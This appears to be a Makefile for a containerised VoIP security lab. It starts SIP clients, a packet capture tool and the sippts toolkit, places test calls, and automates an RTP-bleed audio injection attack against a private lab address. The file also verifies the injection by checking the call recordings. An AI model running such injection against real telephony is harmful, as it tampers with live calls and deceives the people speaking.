DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker compose")

SERVICE ?=

start:
	@$(DOCKER_COMPOSE) up -d 

stop:
	@$(DOCKER_COMPOSE) down

start-wireshark:
	@docker exec -it wireshark wireshark

start-sippts:
	@docker exec -it sippts bash

start-cli-7001:
	@docker exec -it linphone-cli-7001 sh

start-cli-7002:
	@docker exec -it linphone-cli-7002 sh

cli-call:
	@docker exec linphone-cli-7001 linphone-cli-send call sip:7002@10.10.0.5

cli-hangup:
	@docker exec linphone-cli-7001 linphone-cli-send terminate
	@docker exec linphone-cli-7002 linphone-cli-send terminate

cli-status:
	@docker exec linphone-cli-7001 linphone-cli-send calls
	@docker exec linphone-cli-7002 linphone-cli-send calls

start-baresip-7001:
	@docker exec -it baresip-cli-7001 sh

start-baresip-7002:
	@docker exec -it baresip-cli-7002 sh

baresip-call:
	@docker exec baresip-cli-7001 baresip-cli-send /dial sip:7002@10.10.0.5

baresip-hangup:
	@docker exec baresip-cli-7001 baresip-cli-send /hangup
	@docker exec baresip-cli-7002 baresip-cli-send /hangup

baresip-status:
	@docker exec baresip-cli-7001 baresip-cli-send /listcalls
	@docker exec baresip-cli-7002 baresip-cli-send /listcalls

recordings-clean:
	@find recordings -type f \( -name '*.wav' -o -name '*.png' -o -name '*.txt' \) -delete

recordings-list:
	@find recordings -type f | sort

recording-proof:
	@./render-recording-proof.sh

recording-proof-file:
	@test -n "$(FILE)" || (echo "FILE=/path/to/file.wav is required" >&2; exit 1)
	@./render-recording-proof.sh "$(FILE)"

build:
	@$(DOCKER_COMPOSE) build $(SERVICE)


# Build dell'analizzatore
build-analyzer:
	cd audio-analyzer && docker build -t audio-analyzer -f Dockerfile .

# Comando per la verifica automatica
verify-injection: build-analyzer
	@LATEST_WAV=$$(ls -1t recordings/*.wav | head -n 1); \
	if [ -z "$$LATEST_WAV" ]; then echo "Nessuna registrazione trovata"; exit 1; fi; \
	echo "[*] Analizzando: $$LATEST_WAV"; \
	docker run --rm -v $$(pwd)/recordings:/recordings audio-analyzer /$$LATEST_WAV


# Avvia l'intero scenario e lancia l'attacco automaticamente
auto-attack: stop recordings-clean build build-analyzer start
	@echo "[*] Waiting for SIP registration (5 seconds)..."
	@sleep 5
	@echo "[*] Avvio chiamata Baresip..."
	@$(MAKE) baresip-call
	@echo "[*] Identificazione porta RTP in corso..."
	@PORT=$$(./get-attack-cmd.sh --port-only); \
	if [ -z "$$PORT" ]; then \
		echo "[!] Fallito: Porta non trovata."; exit 1; \
	fi; \
	echo "[+] Porta intercettata: $$PORT. Lancio iniezione..."; \
	echo docker exec -it sippts sippts rtpbleedinject -i 10.10.0.5 -r $$PORT -f /audio_inject.wav -p 0
	@echo "[+] Completed attack. Use 'make baresip-hangup' and 'make verify-injection' to check."

# 	@echo "[+] Attacco completato. Usa 'make baresip-hangup' e 'make verify-injection' per controllare."